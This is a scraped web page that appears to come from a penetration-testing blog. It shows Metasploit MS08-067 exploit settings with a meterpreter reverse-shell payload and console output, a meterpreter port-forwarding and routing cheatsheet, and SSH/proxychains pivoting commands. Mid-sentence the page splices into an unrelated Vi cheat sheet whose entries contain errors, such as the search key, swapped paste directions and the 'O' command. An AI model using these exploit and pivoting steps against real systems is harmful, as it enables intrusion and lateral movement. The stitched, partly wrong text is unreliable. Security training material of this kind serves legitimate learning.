class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   RHOST    0.0.0.0          <span class=\"nb\">yes       </span>The target address\n    RPORT    9999             <span class=\"nb\">yes       </span>Set the SMB service port\n    SMBPIPE  BROWSER          <span class=\"nb\">yes       </span>The pipe name to use <span class=\"o\">(</span>BROWSER, SRVSVC<span class=\"o\">)</span>\n\n\n Payload options <span class=\"o\">(</span>windows/meterpreter/reverse_tcp<span class=\"o\">)</span>:\n\n    Name      Current Setting  Required  Description\n    <span class=\"nt\">----</span>      <span class=\"nt\">---------------</span>  <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   EXITFUNC  thread           <span class=\"nb\">yes       </span>Exit technique <span class=\"o\">(</span>accepted: seh, thread, process, none<span class=\"o\">)</span>\n    LHOST     192.168.2.100   <span class=\"nb\">yes       </span>The listen address\n    LPORT     443              <span class=\"nb\">yes       </span>The listen port\n\n\n Exploit target:\n\n    Id  Name\n    <span class=\"nt\">--</span>  <span class=\"nt\">----</span>\n   0   Automatic Targeting</code></pre> \n</figure> \n<h3 id=\"dont-use-127001-with-metasploit\">Don’t use 127.0.0.1 with Metasploit</h3> \n<div class=\"note tip\"> \n <h5>Update: You can now use 127.0.0.2</h5> \n <p>Other 127.0.0.0 addresses can also be used (<code>127.0.0.3</code>,<code>127.0.0.4</code> etc), but not <code>127.0.0.1</code></p> \n</div> \n<p>The example above uses 0.0.0.0 <strong>Not 127.0.0.1</strong>, never use 127.0.0.1 with Metasploit or you’ll get the following error after you attempt to do anything post exploit:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"> exploit<span class=\"o\">(</span>ms08_067_netapi<span class=\"o\">)</span> <span class=\"o\">&gt;</span> exploit\n\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Started reverse handler on 192.168.14.183:443\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Automatically detecting the target...\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Fingerprint: Windows XP - Service Pack 3 - lang:English\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Selected Target: Windows XP SP3 English <span class=\"o\">(</span>AlwaysOn NX<span class=\"o\">)</span>\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Attempting to trigger the vulnerability...\n <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Sending stage <span class=\"o\">(</span>769536 bytes<span class=\"o\">)</span> to 192.168.15.252\n\nmsf meterpreter <span class=\"o\">&gt;</span> getuid\n <span class=\"o\">[</span>-] Session manipulation failed: Validation failed: Address is reserved <span class=\"o\">[</span><span class=\"s2\">\"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/validations.rb:56:in </span><span class=\"sb\">`</span>save!<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/attribute_methods/dirty.rb:33:in `save!'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in <span class=\"sb\">`</span><span class=\"s2\">block in save!'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:313:in </span><span class=\"sb\">`</span>block <span class=\"k\">in </span>with_transaction_returning_status<span class=\"s1\">'\", \"</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2031:in <span class=\"sb\">`</span><span class=\"s2\">block in report_event'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in </span><span class=\"sb\">`</span>with_connection<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2025:in `report_event'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:222:in <span class=\"sb\">`</span><span class=\"s2\">report_event'\"</span>, <span \"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:408:in `block in on_session_output'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in <span \"</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in <span class=\"sb\">`</span><span class=\"s2\">each'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in </span><span class=\"sb\">`</span>method_missing<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/msf/core/session_manager.rb:242:in `block in register'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in <span \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:411:in <span class=\"sb\">`</span><span class=\"s2\">run_single'\"</span>, <span \"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `call'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in <span class=\"sb\">`</span><span class=\"s2\">run'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:66:in </span><span class=\"sb\">`</span>interact<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/msf/base/sessions/meterpreter.rb:396:in `_interact'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/interactive.rb:49:in <span class=\"sb\">`</span><span class=\"s2\">interact'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/core.rb:1745:in </span><span class=\"sb\">`</span>cmd_sessions<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in <span class=\"sb\">`</span><span class=\"s2\">block in run_single'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in </span><span class=\"sb\">`</span>each<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/exploit.rb:142:in <span class=\"sb\">`</span><span class=\"s2\">cmd_exploit'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in </span><span class=\"sb\">`</span>run_command<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in <span class=\"sb\">`</span><span class=\"s2\">each'\"</span>, <span class=\"s2\">\"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in </span><span class=\"sb\">`</span>run_single<span class=\"s1\">'\", \"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:200:in `run'</span><span class=\"s2\">\", \"</span>/opt/metasploit/apps/pro/msf3/msfconsole:148:in <span class=\"sb\">`</span><span class=\"s2\">&lt;main&gt;'\"</span><span class=\"o\">]</span></code></pre> \n</figure> \n<h2 id=\"meterpreter-pivoting-cheatsheet\">Meterpreter Pivoting Cheatsheet</h2> \n<p>Assuming you’ve compromised the target machine and have a meterpreter shell, you can pivot through it by setting up a <strong>meterpreter port forward</strong>.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>portfwd add –l 3389 –p 3389 –r target-host</code></p> </td> \n    <td> <p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>portfwd delete –l 3389 –p 3389 –r target-host</code></p> </td> \n    <td> <p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>portfwd flush</code></p> </td> \n    <td> <p>Meterpreter delete all port forwards</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>portfwd list</code></p> </td> \n    <td> <p>Meterpreter list active port forwards</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>run autoroute -s 192.168.15.0/24</code></p> </td> \n    <td> <p>Use Meterpreters autoroute script to add the route for specified subnet <code>192.168.15.0</code></p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>run autoroute -p</code></p> </td> \n    <td> <p>Meterpreter list all active routes</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>route</code></p> </td> \n    <td> <p>Meterpreter view available networks the compromised host can access</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>route add 192.168.14.0 255.255.255.0 3</code></p> </td> \n    <td> <p>Meterpreter add route for 192.168.14.0/24 via Session 3.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>route delete 192.168.14.0 255.255.255.0 3</code></p> </td> \n    <td> <p>Meterpreter delete route for 192.168.14.0/24 via Session 3.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>route flush</code></p> </td> \n    <td> <p>Meterpreter delete all routes</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note info\"> \n <h5>Meterpreter Port Forwards are flakey</h5> \n <p>Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.</p> \n</div> \n<p>In order to connect to the compromised machine you would run:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Connect to RDP via Meterpreter Port Forward</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">rdesktop 127.0.0.1</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<h2 id=\"pivoting-example-diagrams\">Pivoting Example Diagrams</h2> \n<p>Pivoting can be a bit hard to understand on paper, so here are some diagrams for clarification with the associated commands.</p> \n<p><img src=\"https://i.imgur.com/UVoxUFl.png\" alt=\"Brace for Wonky Visio Arrows\" /></p> \n<h3 id=\"starting-point\">Starting Point</h3> \n<p>You’ll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root.</p> \n<p><img src=\"https://i.imgur.com/zRIqADW.png\" alt=\"SSH Pivot Example 1: Starting Point\" /></p> \n<h3 id=\"routing-traffic-to-the-same-subnet\">Routing Traffic to the Same Subnet</h3> \n<p><img src=\"https://i.imgur.com/TXV6ehn.png\" alt=\"Pivot Example 2: Routing traffic to the same subnet\" /></p> \n<p>####Example commands</p> \n<h5 id=\"ssh-pivoting-using-proxychains\">SSH Pivoting using Proxychains</h5> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Dynamic SSH Pivoting Command using proxy chains</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ssh -D 127.0.0.1:9050 root@192.168.2.2</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>You could then connect to Target 2’s RDP server using:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Connecting to RDP via Proxychains Dynamic Port Forwarding</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">proxychains rdesktop 192.168.2.3</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<h5 id=\"ssh-port-forwarding-command\">SSH Port Forwarding Command</h5> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">RDP SSH Port Forwarding</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ssh -L 3389:192.168.2.3:3389 user@192.168.2.2</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>You could then connect to Target 2’s RDP server using:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Connecting to RDP via SSH Port Forwarding</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">rdesktop 127.0.0.1</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<h3 id=\"ssh-and-meterpreter-pivoting\">SSH and Meterpreter Pivoting</h3> \n<p>This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2.</p> \n<p><img src=\"https://i.imgur.com/gyylQup.png\" alt=\"Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet\" /></p> \n<h4 id=\"example-commands\">Example commands</h4> \n<p>The above commands would be leveraged to reach <strong>Target 2</strong>, from <strong>Target 2</strong> to <strong>Target 3</strong>, meterpreter would be used. Follow the <a href=\"https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet\">meterpreter portwarding example</a> above for a MS08-067 example.</p> \n<p>If href=\"https://highon.coffee/blog/vi-cheat-sheet/#vi-undo-all\" id=\"markdown-toc-vi-undo-all\">Vi Undo All</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/vi-cheat-sheet/#vi-show-file-name\" id=\"markdown-toc-vi-show-file-name\">Vi Show File Name</a></li> \n <li><a href=\"https://highon.coffee/blog/vi-cheat-sheet/#vi-multipliers\" id=\"markdown-toc-vi-multipliers\">Vi Multipliers</a></li> \n</ul> \n<p>A collection of Vi commands in a cheat sheet, handy reference document for learning / remembering Vi commands. I refer to Vim / Vi as the same thing in this document, but in most modern Linux distros vi is often a symlink to vim.</p> \n<p>It’s worth learning Vi as it’s installed on pretty much every Linux base system out there.</p> \n<p>If you’re learning Vi, you might want to check out <a href=\"http://vim-adventures.com\">Vim Adventures</a> - an online adventure game that uses Vi commands.</p> \n<h2 id=\"vim-resources\">Vim Resources</h2> \n<ul> \n <li><a href=\"https://highon.coffee/blog/vi-cheat-sheet\">Vi Cheat Sheet</a></li> \n <li><a href=\"http://themebow.com\">Good looking Vim Themes</a></li> \n <li><a href=\"https://github.com/NullMode/vim\">NullMode’s personal Vim Settings</a></li> \n <li><a href=\"http://vimcasts.org\">Vim Casts</a></li> \n</ul> \n<p>Enjoy the cheat sheet :)</p> \n<h2 id=\"vi-insert-mode--command-mode\">Vi Insert mode &amp; Command Mode</h2> \n<p>Vi has two basic modes, <strong>insert mode</strong> - used for entering text and <strong>command mode</strong>, used for entering commands. See the tip section below for switching between each mode.</p> \n<h3 id=\"vi-insert-mode\">Vi Insert Mode</h3> \n<p>Enter vi insert mode, insert mode is used for inserting text.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>i</code></p> </td> \n    <td> <p>Enter insert mode from command mode.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note tip\"> \n <h5>Vi Command Mode - Vi Insert Mode</h5> \n <p>Vi has two modes, <b>insert mode</b> for inserting text and <b>command mode</b> a common mistake is attempting to edit in command mode. If you are unsure on what mode Vi is using double tap escape (enters command mode) and then hit \"i\" if you wish to enter insert mode.</p> \n</div> \n<h3 id=\"vi-command-mode\">Vi Command Mode</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vim Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Esc</code></p> </td> \n    <td> <p>Hit escape to enter command mode.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-file-navigvation\">Vi File Navigvation</h2> \n<p>Basic file navigation, how to move up, down, left and right.</p> \n<div class=\"note tip\"> \n <h5>Arrow Keys</h5> \n <p>Modern Vi / Vim editors will allow you to use the arrow keys, but it's worth learning the correct way to navigate vi without using the arrow keys in case you come across Vi command line or a shell that doesn't like arrow keys.</p> \n</div> \n<h3 id=\"move-up-down-left-and-right-in-vim\">Move up, down, left and right in Vim</h3> \n<p>You’ll need to be in command mode for these commands, navigation in vi uses <strong>h</strong> <strong>j</strong> <strong>k</strong> <strong>l</strong></p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vim Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>h</code></p> </td> \n    <td> <p>Move left - easy to remember h key is on the left</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>j</code></p> </td> \n    <td> <p>Move down - I remember it with j(d)own for down</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>k</code></p> </td> \n    <td> <p>Move up - k for up - I remember it with (k)up</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>l</code></p> </td> \n    <td> <p>Move right - l is on the right side of hjkl and moves you right</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-page-down\">Vi Page Down</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vim Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Ctrl+F </code></p> </td> \n    <td> <p>Vi move forward a page</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-half-a-page-down\">Vi Half a Page Down</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Ctrl+D </code></p> </td> \n    <td> <p>Vi move half a page down</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-page-up\">Vi Page Up</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Ctrl+B </code></p> </td> \n    <td> <p>Vi move up a page</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-half-a-page-up\">Vi Half a Page Up</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Ctrl+U </code></p> </td> \n    <td> <p>Vi move up half a page</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"more-advanced-ways-of-entering-insert-mode\">More Advanced Ways of Entering Insert Mode</h2> \n<h3 id=\"vi-insert-text-at-start-of-the-line\">Vi Insert Text at Start of the Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>I</code></p> </td> \n    <td> <p>Insert text at the beginning of the line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-insert-text-at-the-end-of-the-line\">Vi Insert Text at the end of the Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>A</code></p> </td> \n    <td> <p>Appends text at the end of the line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-append-text-to-the-right-of-the-cursor\">Vi Append text to the right of the Cursor</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>a</code></p> </td> \n    <td> <p>Appends text to the right of the cursor</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"begin-a-new-line-below\">Begin a new line below</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>o</code></p> </td> \n    <td> <p>Begin a new line, below the current line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-replace-line\">Vi replace line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>O</code></p> </td> \n    <td> <p>Removes line, and allows you to type a new line in it's place</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-replace\">Vi Replace</h2> \n<h3 id=\"change-a-word-in-vi\">Change a Word in Vi</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>cw</code></p> </td> \n    <td> <p>Replaces a single word, place cursor on first letter and hit cw (Change Word)</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"replace-line-but-not-wrapped-text\">Replace line, but not wrapped text</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>c$</code></p> </td> \n    <td> <p>Replaces the current line but doesn’t extend to change the rest of a wrapped sentence on the screen</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-replace-character\">Vi Replace Character</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>r</code></p> </td> \n    <td> <p>Replaces only the character under the cursor</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-replace-1\">Vi Replace</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>R</code></p> </td> \n    <td> <p>Replaces over the top of existing text, until the user hits return.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-delete\">Vi Delete</h2> \n<h3 id=\"vi-delete-single-character-after-the-cursor\">Vi Delete Single Character After the Cursor</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>x</code></p> </td> \n    <td> <p>Vi deletes single character after the cursor</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-delete-character-before-the-cursor\">Vi Delete Character before the Cursor</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>X</code></p> </td> \n    <td> <p>Vi deletes character before the cursor.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-delete-word\">Vi Delete Word</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>dw</code></p> </td> \n    <td> <p>Vi Delete Word, deleted the word under the cursor, from the curosr position onward</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-delete-line-commands\">Vi Delete Line commands</h2> \n<h3 id=\"vi-delete-line\">Vi Delete Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>dd</code></p> </td> \n    <td> <p>Delete the current line in Vi</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-delete-until-end-of-line\">Vi Delete until end of Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>D</code></p> </td> \n    <td> <p>Deletes from cursor to end of line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"delete-to-end-of-screen\">Delete to end of screen</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>dL</code></p> </td> \n    <td> <p>Deletes from cursor to end of screen</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"delete-to-end-of-file\">Delete to end of file</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>dG</code></p> </td> \n    <td> <p>Deletes from cursor to end of file</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-delete-from-cursor-to-start-of-line\">Vi Delete From Cursor To Start of Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>d^</code></p> </td> \n    <td> <p>Deletes from cursor to start of line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-copy-and-paste\">Vi Copy and Paste</h2> \n<h3 id=\"vi-copy-line\">Vi Copy Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>yy</code></p> </td> \n    <td> <p>Copies current line into unnamed buffer</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-copy-3-lines-of-text\">Vi Copy 3 Lines of Text</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>3yy</code></p> </td> \n    <td> <p>Copy 3 lines of text into unnamed buffer</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-copy-word\">Vi Copy Word</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>yw</code></p> </td> \n    <td> <p>Copy word under cursor into unnamed buffer</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-copy-3-words\">Vi Copy 3 Words</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>3yw</code></p> </td> \n    <td> <p>Copy 3 words into unnamed buffer</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-paste-commands\">Vi Paste Commands</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>P</code></p> </td> \n    <td> <p>Copy contents of unamed buffer to right of cursor</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>p</code></p> </td> \n    <td> <p>Copy contents of unamed buffer to left of cursor</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-search-commands\">Vi Search Commands</h2> \n<h3 id=\"vi-search-forward\">Vi Search forward</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>N</code></p> </td> \n    <td> <p>Vi search forward in file</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-back\">Vi Search Back</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    